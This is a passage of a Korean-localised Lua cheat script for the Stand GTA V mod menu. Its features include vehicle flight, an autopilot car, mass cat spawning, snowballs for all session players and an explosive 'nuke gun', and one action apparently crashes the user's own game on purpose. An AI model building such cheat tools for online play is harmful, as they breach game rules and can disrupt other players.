	["SET_CAM_ROT"]=--[[void]] function(--[[Cam (int)]] cam,--[[float]] rotX,--[[float]] rotY,--[[float]] rotZ,--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(cam);native_invoker.push_arg_float(rotX);native_invoker.push_arg_float(rotY);native_invoker.push_arg_float(rotZ);native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("85973643155D0B07");end,
	["_SET_GAMEPLAY_CAM_RELATIVE_ROTATION"]=--[[void]] function(--[[float]] roll,--[[float]] pitch,--[[float]] yaw)native_invoker.begin_call();native_invoker.push_arg_float(roll);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(yaw);native_invoker.end_call("48608C3464F58AB4");end,

}
ENTITYY = {
	["SET_ENTITY_ROTATION"]=function(--[[Entity (int)]] entity,--[[float]] pitch,--[[float]] roll,--[[float]] yaw,--[[int]] rotationOrder,--[[BOOL (bool)]] p5)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(roll);native_invoker.push_arg_float(yaw);native_invoker.push_arg_int(rotationOrder);native_invoker.push_arg_bool(p5);native_invoker.end_call("8524A8B0171D5E07");end,
	["SET_ENTITY_COLLISION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle,--[[BOOL (bool)]] keepPhysics)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.push_arg_bool(keepPhysics);native_invoker.end_call("1A9205C1B9EE827F");end,
	["APPLY_FORCE_TO_ENTITY"]=function(--[[Entity (int)]] entity,--[[int]] forceFlags,--[[float]] x,--[[float]] y,--[[float]] z,--[[float]] offX,--[[float]] offY,--[[float]] offZ,--[[int]] boneIndex,--[[BOOL (bool)]] isDirectionRel,--[[BOOL (bool)]] ignoreUpVec,--[[BOOL (bool)]] isForceRel,--[[BOOL (bool)]] p12,--[[BOOL (bool)]] p13)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_int(forceFlags);native_invoker.push_arg_float(x);native_invoker.push_arg_float(y);native_invoker.push_arg_float(z);native_invoker.push_arg_float(offX);native_invoker.push_arg_float(offY);native_invoker.push_arg_float(offZ);native_invoker.push_arg_int(boneIndex);native_invoker.push_arg_bool(isDirectionRel);native_invoker.push_arg_bool(ignoreUpVec);native_invoker.push_arg_bool(isForceRel);native_invoker.push_arg_bool(p12);native_invoker.push_arg_bool(p13);native_invoker.end_call("C5F68BE9613E2D18");end,
	["FREEZE_ENTITY_POSITION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.end_call("428CA6DBD1094446");end,
}
VEHICLEE = {
	["SET_VEHICLE_FORWARD_SPEED"]=function(--[[Vehicle (int)]] vehicle,--[[float]] speed)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_float(speed);native_invoker.end_call("AB54A438726D25D5");end,
	["SET_VEHICLE_GRAVITY"]=function(--[[Vehicle (int)]] vehicle,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_bool(toggle);native_invoker.end_call("89F149B6131E57DA");end,
	["SET_VEHICLE_EXTRA_COLOURS"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] pearlescentColor,--[[int]] wheelColor)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(pearlescentColor);native_invoker.push_arg_int(wheelColor);native_invoker.end_call("2036F561ADD12E33");end,

}
PADD = {
	["IS_CONTROL_PRESSED"]=function(--[[int]] padIndex,--[[int]] control)native_invoker.begin_call();native_invoker.push_arg_int(padIndex);native_invoker.push_arg_int(control);native_invoker.end_call("F3A21BCD95725A4A");return native_invoker.get_return_value_bool();end,
}

veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
local is_vehicle_flying = false
local dont_stop = false
local no_collision = false
local speed = 6
local reset_veloicty = false

menu.toggle(sportmode, "콘카 비행", {"vehfly"}, "나는 네가 이 명령어에 키를 넣는 것을 추천한다.", function(on_click)
    is_vehicle_flying = on_click
    if reset_veloicty then 
        ENTITYY.FREEZE_ENTITY_POSITION(veh, true)
        util.yield()
        ENTITYY.FREEZE_ENTITY_POSITION(veh, false)
    end
end)
menu.slider(sportmode, "속도", {}, "", 1, 100, 6, 1, function(on_change) 
    speed = on_change
end)
menu.toggle(sportmode, "멈추지 마라", {}, "", function(on_click)
    dont_stop = on_click
end)
menu.toggle(sportmode, "스피드 리셋", {}, "껐다가 계속 움직이면 여기로 쳐봐", function(on_click)
    reset_veloicty = on_click
end)
menu.toggle(sportmode, "신콜리온", {}, "", function(on_click)
    no_collision = on_click
end)


vehicleroll = 0


function do_vehicle_fly() 
    veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
    cam_pos = CAMM.GET_GAMEPLAY_CAM_ROT(0);
    ENTITYY.SET_ENTITY_ROTATION(veh, cam_pos.x, vehicleroll, cam_pos.z, 2, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, not no_collision, true);
    if PADD.IS_CONTROL_PRESSED(0, 108) then 
        vehicleroll = vehicleroll -1
    end

    if PADD.IS_CONTROL_PRESSED(0, 109) then 
        vehicleroll = vehicleroll +1
       
    end

    local locspeed = speed*10
    local locspeed2 = speed
    if PADD.IS_CONTROL_PRESSED(0, 61) then 
        locspeed = locspeed*2
        locspeed2 = locspeed2*2
    end

    
    if PADD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 72) then
		local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed * 2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
        end
   end
    if PADD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed)*2
        if not PADD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed*2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
	if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
    end
end


util.create_tick_handler(function() 


    -- Added by LAZ
    if PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(),false) == 0 then
        if is_vehicle_flying then
            menu.trigger_commands("vehfly")
            util.toast("정지상태야, 차 안에 있는 게 아니야.")
        end
    else
        if is_vehicle_flying then do_vehicle_fly() end


    end

    -- End Added by LAZ

    VEHICLEE.SET_VEHICLE_GRAVITY(veh, not is_vehicle_flying) 
    if not is_vehicle_flying then 
        ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    end

    return true
end)
util.on_stop(function() 
    VEHICLEE.SET_VEHICLE_GRAVITY(veh, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, true, true);
end)


--------------------------------------------------------------------------------------------------------------------------------
-- Diversion

menu.toggle(fun, "테슬라 조종사", {}, "", function(toggled)
    local ped = players.user_ped()
    local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
    local pos = ENTITY.GET_ENTITY_COORDS(ped)
    local tesla_ai = util.joaat("u_m_y_baygor")
    local tesla = util.joaat("raiden")
    request_model(tesla_ai)
    request_model(tesla)
    if toggled then     
       if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            menu.trigger_commands("deletevehicle")
        end

        tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
        tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true) 
        ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
        PED.SET_PED_INTO_VEHICLE(ped, tesla_vehicle, -2)
        PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
        PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
        VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
        VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
        menu.trigger_commands("performance")

        if HUD.IS_WAYPOINT_ACTIVE() then
            local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
            TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20.0, 786603, 0)
        else
            TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20.0, 786603)
        end
    else
        if tesla_ai_ped ~= nil then 
            entities.delete_by_handle(tesla_ai_ped)
        end
        if tesla_vehicle ~= nil then 
            entities.delete_by_handle(tesla_vehicle)
        end
    end
end)


local randomizer = function(x)
    local r = math.random(1,3)
    return x[r]
end

array = {"1","1","2"}

menu.action(fun, "방아쇠를 당기다", {}, "당신의 게임으로 러시아 룰렛을 연주하세요.", function()
    if randomizer(array) == "1" then
        util.toast("넌 살아남았어 :D")
    else
        util.log("네 게임은 끝났어 D:")
        ENTITY.APPLY_FORCE_TO_ENTITY(0, 0, 0, 0, 0, 0, 0, 0, 0, false, false, false, false, false)
    end
end)

menu.action(fun, "눈 전쟁", {}, "그는 세션에 있는 모든 선수들에게 눈덩이를 준다.", function ()
    local plist = players.list()
    local snowballs = util.joaat('WEAPON_SNOWBALL')
    for i = 1, #plist do
        local plyr = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(plist[i])
        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(plyr, snowballs, 20, true)
        WEAPON.SET_PED_AMMO(plyr, snowballs, 20)
        util.toast("이제 모두 눈덩이를 가졌어!")
        util.yield()
    end
   
end)

menu.toggle_loop(fun, "마스코트 고양이", {}, "", function()
    if not jinx_pet or not ENTITY.DOES_ENTITY_EXIST(jinx_pet) then
        local jinx = util.joaat("a_c_cat_01")
        request_model(jinx)
        local pos = players.get_position(players.user())
        jinx_pet = entities.create_ped(28, jinx, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(jinx_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jinx_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(jinx_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(jinx_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(jinx_pet)
    jinx_pet = nil
end)




local jinx_army = {}
local army = menu.list(fun, "가투노 공격", {}, "고양이를 데려와 고양이 많이!")
menu.click_slider(army, "스폰어 공격 G", {}, "", 1, 256, 30, 1, function(val)
    local player = players.user_ped()
    local pos = ENTITY.GET_ENTITY_COORDS(player, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local jinx = util.joaat("a_c_cat_01")
    request_model(jinx)
     for i = 1, val do
        jinx_army[i] = entities.create_ped(28, jinx, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jinx_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(jinx_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(jinx_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(jinx_army[i], player, 0, -0.3, 0, 7.0, -1, 10, true)
        util.yield()
     end 
end)

menu.action(army, "청소하다 G", {}, "", function()
    for i, jinx in ipairs(jinx_army) do
        entities.delete_by_handle(jinx_army[i])
    end
end)

--colorizev_root = menu.list(fun, "Colorear coches", {"lancescriptcolorize"}, "Pinta los coches de alrededor!")

--custom_r = 254
--menu.slider(colorizev_root, "Custom R", {"colorizecustomr"}, "", 1, 255, 254, 1, function(s)
--    custom_r = s
--end)

--custom_g = 2
--menu.slider(colorizev_root, "Custom G", {"colorizecustomg"}, "", 1, 255, 2, 1, function(s)
--    custom_g = s
--end)

--custom_b = 252
--menu.slider(colorizev_root, "Custom B", {"colorizecustomb"}, "", 1, 255, 252, 1, function(s)
--    custom_b = s
--end)

--menu.action(colorizev_root, "RGB preset: Stand magenta", {"rpstandmagenta"}, "g", function(on_click)
--    menu.trigger_commands("colorizecustomr 254")
 --   menu.trigger_commands("colorizecustomg 2")
 --   menu.trigger_commands("colorizecustomb 252")
--end)

--menu.toggle(colorizev_root, "Colorize vehicles", {"colorizevehicles"}, "Colorizes all nearby vehicles with the valus you set! Turn on rainbow to RGB this ;", function(on)
--    if on then
--        colorize_cars = true
--        custom_rgb = true
--        mod_uses("vehicle", 1)
--    else
--        colorize_cars = false
--        custom_rgb = false
--        mod_uses("vehicle", -1)
--    end
--end, false)

--menu.toggle(colorizev_root, "Rainbow", {"rainbowvehicles"}, "Requires colorize vehicles to be turned on.", function(on)
--    if not colorize_cars then
--        menu.trigger_commands("colorizevehicles on")
--    end
--    custom_rgb = not on
--end, false)

armanuc = menu.list(fun, "핵 옵션", {}, "")

local nuke_gun_toggle = menu.toggle(armanuc, "핵무기", {"JSnukeGun"}, "rpg는 핵을 발사한다.", function(toggle)
    nuke_running = toggle	
    if nuke_running then
        if animals_running then menu.trigger_command(exp_animal_toggle, "off") end
        util.create_tick_handler(function()
            if WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID()) == -1312131151 then --if holding homing launcher
                if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                    if not remove_projectiles then 
                        remove_projectiles = true 
                        disableProjectileLoop(-1312131151)
                    end
                    util.create_thread(function()
                        local hash = util.joaat("w_arena_airmissile_01a")
                        STREAMING.REQUEST_MODEL(hash)
                        yieldModelLoad(hash)
                        local cam_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)   
                        local dir, pos = direction()
                        local bomb = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, pos.x, pos.y, pos.z, true, true, false)
                        ENTITY.APPLY_FORCE_TO_ENTITY(bomb, 0, dir.x, dir.y, dir.z, 0.0, 0.0, 0.0, 0, true, false, true, false, true)
                        ENTITY.SET_ENTITY_ROTATION(bomb, cam_rot.x, cam_rot.y, cam_rot.z, 1, true)
                        while not ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(bomb) do util.yield() end
                        local nukePos = ENTITY.GET_ENTITY_COORDS(bomb, true)
                        entities.delete(bomb)
                        executeNuke(nukePos)
                    end)
                else
                    remove_projectiles = false
                end
            else
                remove_projectiles = false
            end
            return nuke_running
        end)
    end
end)

local nuke_height = 40
menu.slider(armanuc, "라누크 고원", {"JSnukeHeight"}, "웨이포인트에 핵이 떨이집니다", 10, 100, nuke_height, 10, function(value)
    nuke_height = value
end)

function executeNuke(pos)	
    for a = 0, nuke_height, 4 do
        FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z + a, 8, 10, true, false, 1, false)	
        util.yield(50)
    end
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x +8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y +8, pos.z + nuke_height, 82, 10, true, false, 1, false)
    FIRE.ADD_EXPLOSION(pos.x -8, pos.y -8, pos.z + nuke_height, 82, 10, true, false, 1, false)
end

--------------------------------------------------------------------------------------------------------------------------------
-- Misc
--local visual_stuff = {
--    {"Better Illumination", "AmbientPush"},
--    {"Oversaturated", "rply_saturation"},
--    {"Boost Everything", "LostTimeFlash"},
--    {"Foggy Night", "casino_main_floor_heist"},
--    {"Better Night Time", "dlc_island_vault"},
--    {"Normal Fog", "Forest"},
--    {"Heavy Fog", "nervousRON_fog"},
--    {"Firewatch", "MP_Arena_theme_evening"},
--    {"Warm", "mp_bkr_int01_garage"},
--    {"Deepfried", "MP_deathfail_night"},
--    {"Stoned", "stoned"},
--    {"Underwater", "underwater"},
--}

--local visual_fidelity = menu.list(misc, "Visuales", {}, "")
--for id, data in pairs(visual_stuff) do
--    local effect_name = data[1]
--    local effect_thing = data[2]
--    menu.toggle(visual_fidelity, effect_name, {""}, "", function(toggled)
--        if toggled then
--            GRAPHICS.SET_TIMECYCLE_MODIFIER(effect_thing)
--            menu.trigger_commands("shader apagaos")
--        else
--            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
--        end
--    end)
--end 

menu.toggle(misc, "스크린샷 모드", {}, "그래서 여러분은 사진을 찍을 수 있고, <3", function(on)
	if on then
		menu.trigger_commands("screenshot on")
	else
		menu.trigger_commands("screenshot off")
	end
end)

menu.toggle(misc, "스탠드 식별자", {}, "다른 스탠드 사용자를 식별하지만 사용자도 식별할 수 있습니다.", function(on_toggle)
    local standid = menu.ref_by_path("Online>Protections>Detections>Stand User Identification")
    if on_toggle then
        menu.trigger_command(standid, "on")
    else
        menu.trigger_command(standid, "off")
    end
end)

menu.hyperlink(misc, "미 깃허브", "https://github.com/xxpichoclesxx")

menu.hyperlink(menu.my_root(), "디스코드 참여!", "https://discord.gg/BNbSHhunPv")
local credits = menu.list(misc, "크레딧", {}, "")
local devcred = menu.list(credits, "크레딧 개발", {}, "")
local othercred = menu.list(credits, "오트로스 크레도스", {}, "")
menu.action(devcred, "JinxScript/Prisuhm", {}, "prisuhm의 스키드 코드, 이것은 내가 그와 약간의 토론을 하기 전에 추가한 것입니다. 우리는 그가 굉장하고 거의 모든 단일 기능을 코딩했기 때문에 이 커뮤니티에서 그를 사랑합니다. \n고유하고 독특해서 감사합니다.", function()
end)
menu.action(devcred, "gLance", {}, "그는 나에게 Gta V 네이티브들에게 많은 도움을 주었다.", function()
end)
menu.action(devcred, "LanceScriptTEOF", {}, "그는 내가 Gta V 네이티브를 배우고 이해하도록 도왔습니다.", function()
end)
menu.action(devcred, "Aaron", {}, "스탠드 루아 API의 첫 단계를 도와주셔서 감사합니다.", function()
end)
menu.action(devcred, "Cxbr", {}, "친숙한 기능을 위한 <3", function()
end)
menu.action(devcred, "Sapphire", {}, "내 멍청한 두뇌 때문에 거의 모든 기능과 인내심을 가지고 나를 도운 사람 <3", function()
end)
menu.action(devcred, "candypie", {}, "기능을 테스트하고 일부 스크립트 이벤트를 추가하는 데 도움이 됩니다.", function()
end)
menu.action(othercred, "Emir, Joju, Pepe, Ady, Vicente, Sammy", {}, "이것은 그들 없이는 절대 불가능할 것이다. <3", function()
end)
menu.action(othercred, "Wigger", {}, "그는 대본에 몇 가지 아이디어와 몇 가지 기능을 가져왔다.", function()
end)
menu.action(othercred, "Ducklett", {}, "그는 대본을 완전히 영어로 번역했다.", function()
end)
menu.action(othercred, "HADES", {}, "그는 대본을 한국어로 완전히 번역했다.", function()
end)
menu.action(othercred, "You <3", {}, "스크립트를 다운로드하고 개선을 위한 아이디어를 제공하는 사용자 <3", function()
end)

util.on_stop(function ()
    VEHICLE.SET_VEHICLE_GRAVITY(veh, true)
    ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    menu.collect_garbage()
    sleep(100)
    util.toast("안녕히 계십시오 Good-bye; :3")
    util.toast("청소 중...")
end)

players.dispatch_on_join()
